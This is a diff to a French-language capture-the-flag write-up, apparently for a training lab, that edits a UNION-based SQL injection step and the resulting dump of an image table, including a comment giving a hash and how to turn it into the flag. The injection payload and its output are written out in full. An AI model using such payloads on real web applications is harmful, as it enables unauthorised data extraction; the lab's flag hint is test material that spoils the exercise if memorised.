@@ -60,54 +60,34 @@ On cherche donc des informations intéressantes.
 
 On try 2 part 2 les champs jusqu'à trouver 1 colonne intéressant, **title** qui donne (avec **Url**):
 
-<code>1 or 1=1 UNION select url, comment from list_images</code>
+<code>1 UNION select url, comment from list_images</code>
 
 <pre>
-ID: 1 or 1=1 UNION select url, comment from list_images 
+ID: 1 UNION SELECT url, comment from list_images 
 Title: Nsa
 Url : https://www.nsa.org/img.jpg
 
-ID: 1 or 1=1 UNION select url, comment from list_images 
-Title: 42 !
-Url : https://www.42.fr/42.png
-
-ID: 1 or 1=1 UNION select url, comment from list_images 
-Title: Google
-Url : https://www.google.fr/google.png
-
-ID: 1 or 1=1 UNION select url, comment from list_images 
-Title: Obama
-Url : https://www.obama.org/obama.jpg
-
-ID: 1 or 1=1 UNION select url, comment from list_images 
-Title: Hack me ?
-Url : borntosec.ddns.net/images.png
-
-ID: 1 or 1=1 UNION select url, comment from list_images 
-Title: tr00l
-Url : https://www.h4x0r3.0rg/tr0ll.png
-
-ID: 1 or 1=1 UNION select url, comment from list_images 
+ID: 1 UNION SELECT url, comment from list_images 
 Title: An image about the NSA !
 Url : https://www.nsa.org/img.jpg
 
-ID: 1 or 1=1 UNION select url, comment from list_images 
+ID: 1 UNION SELECT url, comment from list_images 
 Title: There is a number..
 Url : https://www.42.fr/42.png
 
-ID: 1 or 1=1 UNION select url, comment from list_images 
+ID: 1 UNION SELECT url, comment from list_images 
 Title: Google it !
 Url : https://www.google.fr/google.png
 
-ID: 1 or 1=1 UNION select url, comment from list_images 
+ID: 1 UNION SELECT url, comment from list_images 
 Title: Yes we can !
 Url : https://www.obama.org/obama.jpg
 
-ID: 1 or 1=1 UNION select url, comment from list_images 
+ID: 1 UNION SELECT url, comment from list_images 
 Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
 Url : borntosec.ddns.net/images.png
 
-ID: 1 or 1=1 UNION select url, comment from list_images 
+ID: 1 UNION SELECT url, comment from list_images 
 Title: Because why not ?
 Url : https://www.h4x0r3.0rg/tr0ll.png
 </pre>
